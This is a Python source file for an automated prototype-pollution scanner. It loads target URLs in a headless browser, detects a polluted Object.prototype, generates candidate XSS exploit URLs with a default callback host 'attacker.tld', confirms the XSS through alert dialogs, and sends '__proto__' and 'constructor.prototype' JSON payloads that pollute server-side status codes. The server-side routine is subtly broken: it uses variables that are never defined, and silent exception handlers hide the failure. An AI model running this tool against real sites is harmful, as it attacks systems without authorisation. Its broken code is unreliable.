import asyncio
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from playwright.async_api import async_playwright, BrowserContext, Page
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

from . import fingerprints, payloads

CHECK_SCRIPT = "(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved' && true || false"
console = Console()

class Scanner:
    def __init__(self, concurrency: int = 15, timeout: int = 30, proxy: str = None, headers: dict = None, user_agent: str = None, verify_exploit: bool = False, callback_url: str = "attacker.tld", sspp: bool = False):
        self.concurrency = concurrency
        self.timeout = timeout
        self.proxy = proxy
        self.headers = headers or {}
        self.user_agent = user_agent
        self.verify_exploit = verify_exploit
        self.callback_url = callback_url
        self.sspp = sspp
        self.semaphore = asyncio.Semaphore(concurrency)
        self.known_targets = set()

    async def scan(self, urls: list[str]):
        async with async_playwright() as p:
            launch_args = [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-gpu",
                "--disable-software-rasterizer"
            ]
            

            proxy_config = None
            if self.proxy:
                proxy_config = {"server": self.proxy}

            browser = await p.chromium.launch(args=launch_args, proxy=proxy_config)
            

            context_options = {
                "ignore_https_errors": True,
                "extra_http_headers": self.headers
            }
            if self.user_agent:
                context_options["user_agent"] = self.user_agent
                
            context = await browser.new_context(**context_options)
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            ) as progress:
                task_id = progress.add_task("[cyan]Scanning...", total=len(urls))
                
                tasks = [self._scan_single(context, url, progress, task_id) for url in urls]
                
                results = []
                for future in asyncio.as_completed(tasks):
                    res = await future
                    if res:
                        results.append(res)
                        
            await browser.close()
            return results

    async def _scan_single(self, context: BrowserContext, url: str, progress: Progress, task_id):
        async with self.semaphore:
            if self.sspp:
                return await self._scan_sspp(context, url, progress, task_id)
            
            page = None
            try:
                page = await context.new_page()
                try:
                    for attempt in range(3):
                        try:
                            await page.goto(url, timeout=self.timeout * 1000, wait_until="domcontentloaded")
                            break
                        except Exception:
                            if attempt == 2:
                                return
                            await asyncio.sleep(1)
                except Exception as e:
                    pass
                    return

                page.on("console", lambda msg: progress.print(f"[dim]Console: {msg.text}[/dim]"))

                is_vuln = False
                try:
                    is_vuln = await page.evaluate(CHECK_SCRIPT)
                except Exception:
                    pass

                if is_vuln:
                    progress.print(f"[bold green]VULN[/bold green] {url}", soft_wrap=True)
                    
                    gadgets = []
                    try:
                        gadgets = await page.evaluate(fingerprints.FINGERPRINT_JS)
                        if not isinstance(gadgets, list):
                            gadgets = []
                    except Exception:
                        pass
                        
                    clean_url = self._clean_url(url)
                    
                    if clean_url not in self.known_targets:
                        self.known_targets.add(clean_url)
                        
                        if gadgets:
                            potentials_results = []
                            for gadget in gadgets:
                                potentials = fingerprints.get_potential_urls(clean_url, [gadget], self.callback_url)
                                for potential_url, g_name in potentials:
                                     progress.print(f"    [cyan]Potential[/cyan] ({g_name}): {potential_url}", soft_wrap=True)
                                     
                                     confirmed = False
                                     if self.verify_exploit:
                                         confirmed = await self._verify_xss(context, potential_url, progress)
                                         
                                     potentials_results.append({
                                         "gadget": g_name,
                                         "url": potential_url,
                                         "confirmed_xss": confirmed,
                                         "message": confirmed if isinstance(confirmed, str) else None
                                     })

                else:
                    pass 

            except Exception as e:
                pass
            finally:
                if page:
                    await page.close()
                progress.advance(task_id)
                
            if is_vuln:
                return {
                    "url": url,
                    "gadgets": [g_name for _, g_name in potentials] if 'potentials' in locals() else [],
                    "details": potentials_results if 'potentials_results' in locals() else []
                }
            return None

    async def _scan_sspp(self, context: BrowserContext, url: str, progress: Progress, task_id):
        page = None
        try:
            payload = {
                "__proto__": {
                    rand_key: rand_val
                }
            }
            
            try:
                api_request = context.request
                response = await api_request.post(
                    url, 
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout * 1000
                )
                
                resp_json = await response.json()
                if isinstance(resp_json, (dict, list)):
                    if self._recursive_search(resp_json, rand_key, rand_val):
                         progress.print(f"[bold green]VULN (SSPP)[/bold green] {url} - Reflected property {rand_key}:{rand_val} via {payload_type}", soft_wrap=True)
                         return {
                             "url": url,
                             "vuln_type": "SSPP",
                             "payload_type": payload_type,
                             "details": f"Reflected property {rand_key}:{rand_val}"
                         }
                         
            except Exception:
                pass
            
            malformed_payload = "invalid json}"
            baseline_status = None
            
            try:
                api_request = context.request
                resp_baseline = await api_request.post(
                    url, 
                    data=malformed_payload,
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout * 1000
                )
                try:
                    baseline_json = await resp_baseline.json()
                    if isinstance(baseline_json, dict):
                         baseline_status = baseline_json.get("status") or baseline_json.get("statusCode")
                except:
                    pass
            except:
                pass

            polluted_status_code = 555
            status_payloads = [
                ("__proto__", {
                    "__proto__": {
                        "status": polluted_status_code,
                        "statusCode": polluted_status_code
                    }
                }),
                ("constructor.prototype", {
                    "constructor": {
                        "prototype": {
                            "status": polluted_status_code,
                            "statusCode": polluted_status_code
                        }
                    }
                })
            ]

            for payload_type, payload in status_payloads:
                try:
                    await api_request.post(
                        url, 
                        data=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=self.timeout * 1000
                    )
                    
                    resp_probe = await api_request.post(
                        url, 
                        data=malformed_payload,
                        headers={"Content-Type": "application/json"},
                        timeout=self.timeout * 1000
                    )
                    
                    try:
                        probe_json = await resp_probe.json()
                        if isinstance(probe_json, dict):
                             probe_status = probe_json.get("status") or probe_json.get("statusCode")
                             
                             if probe_status == polluted_status_code:
                                 if baseline_status != polluted_status_code:
                                     progress.print(f"[bold green]VULN (SSPP - Status Override)[/bold green] {url} - Status code became {polluted_status_code} via {payload_type}", soft_wrap=True)
                                     return {
                                         "url": url,
                                         "vuln_type": "SSPP_STATUS_OVERRIDE",
                                         "payload_type": payload_type,
                                         "details": f"Status code override to {polluted_status_code}"
                                     }
                    except Exception:
                        pass
                        
                except Exception:
                    pass

        except Exception as e:
            pass
        finally:
            progress.advance(task_id)
        return None

    def _recursive_search(self, obj, key, value):
        if isinstance(obj, dict):
            if obj.get(key) == value:
                return True
            for k, v in obj.items():
                if self._recursive_search(v, key, value):
                    return True
        elif isinstance(obj, list):
            for item in obj:
                if self._recursive_search(item, key, value):
                    return True
        return False

    async def _verify_xss(self, context: BrowserContext, url: str, progress: Progress):
        page = None
        try:
            page = await context.new_page()
            
            dialog_future = asyncio.Future()
            
            def handle_dialog(dialog):
                if not dialog_future.done():
                    dialog_future.set_result(dialog.message)
                asyncio.create_task(dialog.dismiss())

            page.on("dialog", handle_dialog)
            
            try:
                await page.goto(url, timeout=10000, wait_until="domcontentloaded")
                await asyncio.wait_for(dialog_future, timeout=5.0)
                msg = dialog_future.result()
                progress.print(f"        [bold red]CONFIRMED XSS[/bold red] via Alert! Message: {msg}", soft_wrap=True)
                return msg
            except (asyncio.TimeoutError, Exception):
                pass
                
        except Exception:
            pass
        finally:
            if page:
                await page.close()
        return False

    def _clean_url(self, url: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        detection_payloads = set(payloads.get_payloads())
        
        new_query = {}
        for k, v in query.items():
            if k not in detection_payloads:
                new_query[k] = v
                
        encoded_query = urlencode(new_query, doseq=True)
        return urlunparse(parsed._replace(query=encoded_query))
